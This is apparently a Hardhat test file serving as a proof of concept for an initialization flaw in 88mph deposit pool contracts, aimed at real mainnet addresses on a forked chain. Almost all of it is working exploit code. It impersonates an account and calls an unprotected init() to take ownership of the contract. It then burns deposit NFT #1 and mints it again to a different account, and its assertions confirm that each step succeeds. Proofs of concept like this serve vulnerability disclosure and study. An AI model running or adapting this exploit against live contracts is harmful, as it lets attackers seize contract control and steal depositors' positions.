const { expect, assert } = require("chai");
const { ethers } = require("hardhat");
const {expectRevert} = require("@openzeppelin/test-helpers");

describe("88mph Function Initialization Exploit PoC", function () {
    this.timeout("250000");
    let target;
    let accounts;
    before(async () => {
      // init the deployed contract and accounts
      // 0xF0b7DE03134857391d8D43Ed48e20EDF21461097 - 88mph yaLINK Pool Deposit
      // 0x6a76f1c362f2C871BEB9d930c9eFd02B07841A28 - 88mph Harvest CRV:STETH Pool Deposit
      target = await hre.ethers.getVerifiedContractAt("0xF0b7DE03134857391d8D43Ed48e20EDF21461097");
      accounts = await ethers.getSigners();
    });
    
    it("Read the correct address", async function () {   
      console.log("the contract address at block 11866111 is: " + target.address);
    });

    it("Read the state varibles of 88mph", async function () {   
        console.log("Current Owner of the Contract: " + await target.owner());
        console.log("NFT Owner of #1: " + await target.ownerOf(1));
    });

    it("Calling the init() function", async function () {   
        console.log("Current Owner of the Contract: " + await target.owner());
        
        const attackerAddress = accounts[2].address;

        //Impersonate the attackerAddress account and send transaction
        await hre.network.provider.request({
            method: "hardhat_impersonateAccount",
            params: [attackerAddress]}
        );
        const attackerAccountSigner = await ethers.provider.getSigner(attackerAddress);

        const tx = await target.connect(attackerAccountSigner).init(attackerAddress,0,0);

        console.log("Transaction initiated from EOA: " + tx.from);
        console.log("Current Owner of the Contract: " + await target.owner());
        expect(await target.owner()).to.equal(attackerAddress);
    });

    it("Calling the burn() and mint() function", async function () {   
        console.log("Current Owner of the Contract: " + await target.owner());
        
        const attackerAddress = accounts[1].address;
        const nftRecipient = accounts[2].address;
        //Impersonate the attackerAddress account and send transaction
        await hre.network.provider.request({
            method: "hardhat_impersonateAccount",
            params: [attackerAddress]}
        );
        const attackerAccountSigner = await ethers.provider.getSigner(attackerAddress);

        const tx = await target.connect(attackerAccountSigner).init(attackerAddress,0,0);

        console.log("Current Owner of the Contract: " + await target.owner());
        console.log("Before: NFT Owner of #1: " + await target.ownerOf(1));

        //Burn Token#1
        const burnTx = await target.connect(attackerAccountSigner).burn(1);
        //await expectRevert.unspecified(target.connect(attackerAccountSigner).ownerOf(1));
        await expect(target.connect(attackerAccountSigner).ownerOf(1)).to.be.revertedWith("ERC721: owner query for nonexistent token");
        
        //Mint Token#1
        const mintTx = await target.connect(attackerAccountSigner).mint(nftRecipient, 1);
        console.log("After: NFT Owner of #1: " + await target.ownerOf(1));
        expect(await target.ownerOf(1)).to.equal(nftRecipient);

    });

    



 
  });